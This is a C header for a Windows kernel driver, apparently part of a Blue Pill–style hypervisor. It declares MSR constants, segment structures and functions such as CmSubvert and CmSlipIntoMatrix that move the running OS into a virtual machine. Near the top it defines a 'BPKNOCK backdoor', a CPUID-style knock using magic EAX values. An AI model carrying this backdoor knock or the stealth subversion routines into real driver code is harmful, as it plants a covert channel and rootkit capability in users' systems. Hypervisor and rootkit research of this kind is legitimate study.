#ifndef _INCLIB_H
#define _INCLIB_H

#include <ntddk.h>
#include <intrin.h>

//#include "comprint.h"

//Macro Definition
//#define ENABLE_DEBUG_PRINTS
//#define USE_LOCAL_DBGPRINTS

#ifdef ENABLE_DEBUG_PRINTS
# define Trace(x) ComPrint x
#else
# define Trace(x) {}
#endif

// BPKNOCK backdoor -------
#define BP_KNOCK
#ifdef BP_KNOCK
# define BP_KNOCK_EAX	0xbabecafe
# define BP_KNOCK_EAX_ANSWER 0x69696969
#endif // BP_KNOCK

/*
* Intel CPU  MSR
*/

#define MSR_IA32_SYSENTER_CS		0x174
#define MSR_IA32_SYSENTER_ESP		0x175
#define MSR_IA32_SYSENTER_EIP		0x176
#define MSR_IA32_DEBUGCTL			0x1d9

/* x86-64 MSR */

#define MSR_EFER 0xc0000080           /* extended feature register */
#define MSR_STAR 0xc0000081           /* legacy mode SYSCALL target */
#define MSR_LSTAR 0xc0000082          /* long mode SYSCALL target */
#define MSR_CSTAR 0xc0000083          /* compatibility mode SYSCALL target */
#define MSR_SYSCALL_MASK 0xc0000084   /* EFLAGS mask for syscall */
#define MSR_FS_BASE 0xc0000100                /* 64bit FS base */
#define MSR_GS_BASE 0xc0000101                /* 64bit GS base */
#define MSR_SHADOW_GS_BASE  0xc0000102        /* SwapGS GS shadow */ 

#define LA_ACCESSED		0x01
#define LA_READABLE		0x02    // for code segments
#define LA_WRITABLE		0x02    // for data segments
#define LA_CONFORMING	0x04    // for code segments
#define LA_EXPANDDOWN	0x04    // for data segments
#define LA_CODE			0x08
#define LA_STANDARD		0x10
#define LA_DPL_0		0x00
#define LA_DPL_1		0x20
#define LA_DPL_2		0x40
#define LA_DPL_3		0x60
#define LA_PRESENT		0x80

//Struct Definition
typedef struct _GUEST_REGS
{
	ULONG64 rax;                  // 0x00         // NOT VALID FOR SVM
	ULONG64 rcx;
	ULONG64 rdx;                  // 0x10
	ULONG64 rbx;
	ULONG64 rsp;                  // 0x20         // rsp is not stored here on SVM
	ULONG64 rbp;
	ULONG64 rsi;                  // 0x30
	ULONG64 rdi;
	ULONG64 r8;                   // 0x40
	ULONG64 r9;
	ULONG64 r10;                  // 0x50
	ULONG64 r11;
	ULONG64 r12;                  // 0x60
	ULONG64 r13;
	ULONG64 r14;                  // 0x70
	ULONG64 r15;
} GUEST_REGS, *PGUEST_REGS;

typedef NTSTATUS(* PCALLBACK_PROC) (PVOID Param);

#pragma pack (push, 1)

typedef union
{
	USHORT UCHARs;
	struct
	{
		USHORT type : 4;              /* 0;  Bit 40-43 */
		USHORT s : 1;                 /* 4;  Bit 44 */
		USHORT dpl : 2;               /* 5;  Bit 45-46 */
		USHORT p : 1;                 /* 7;  Bit 47 */
		// gap!       
		USHORT avl : 1;               /* 8;  Bit 52 */
		USHORT l : 1;                 /* 9;  Bit 53 */
		USHORT db : 1;                /* 10; Bit 54 */
		USHORT g : 1;                 /* 11; Bit 55 */
		USHORT Gap : 4;
	} fields;
} SEGMENT_ATTRIBUTES;

typedef struct
{
	USHORT sel;
	SEGMENT_ATTRIBUTES attributes;
	ULONG32 limit;
	ULONG64 base;
} SEGMENT_SELECTOR;

typedef struct
{
	USHORT limit0;
	USHORT base0;
	UCHAR base1;
	UCHAR attr0;
	UCHAR limit1attr1;
	UCHAR base2;
} SEGMENT_DESCRIPTOR,
*PSEGMENT_DESCRIPTOR;

#pragma pack (pop)

typedef ULONG BPSPIN_LOCK, *PBPSPIN_LOCK;
typedef struct _CPU *PCPU;

typedef enum SEGREGS
{
	ES = 0,
	CS,
	SS,
	DS,
	FS,
	GS,
	LDTR,
	TR
};

//Asm Definition
//VOID NTAPI GetCpuIdInfo(
//	ULONG32 fn,
//	OUT PULONG32 ret_eax,
//	OUT PULONG32 ret_ebx,
//	OUT PULONG32 ret_ecx,
//	OUT PULONG32 ret_edx
//	);

USHORT NTAPI RegGetCs();
USHORT NTAPI RegGetDs();
USHORT NTAPI RegGetEs();
USHORT NTAPI RegGetSs();
USHORT NTAPI RegGetFs();
USHORT NTAPI RegGetGs();
USHORT NTAPI GetTrSelector();
USHORT NTAPI GetLdtr();
USHORT NTAPI GetGdtLimit();
USHORT NTAPI GetIdtLimit();
ULONG64 NTAPI GetGdtBase();
ULONG64 NTAPI GetIdtBase();
ULONG64 NTAPI RegGetRflags();
ULONG64 NTAPI RegGetTSC();

NTSTATUS NTAPI CmSubvert(PVOID);
NTSTATUS NTAPI CmSlipIntoMatrix(PVOID);

//C Definition
BOOLEAN CmIsBitSet(ULONG64 v, UCHAR bitNo);
NTSTATUS CmDeliverToProcessor(
	CCHAR activeProcessors,
	PCALLBACK_PROC CallbackProc,
	PVOID CallbackParam,
	PNTSTATUS pCallbackStatus
	);
NTSTATUS CmInitializeSegmentSelector(
	SEGMENT_SELECTOR * SegmentSelector,
	USHORT Selector,
	PUCHAR GdtBase
	);
NTSTATUS CmSetGdtEntry(
	PSEGMENT_DESCRIPTOR GdtBase,
	ULONG GdtLimit,
	ULONG SelectorNumber,
	PVOID SegmentBase,
	ULONG SegmentLimit,
	UCHAR LowAttributes,
	UCHAR HighAttributes
	);

#endif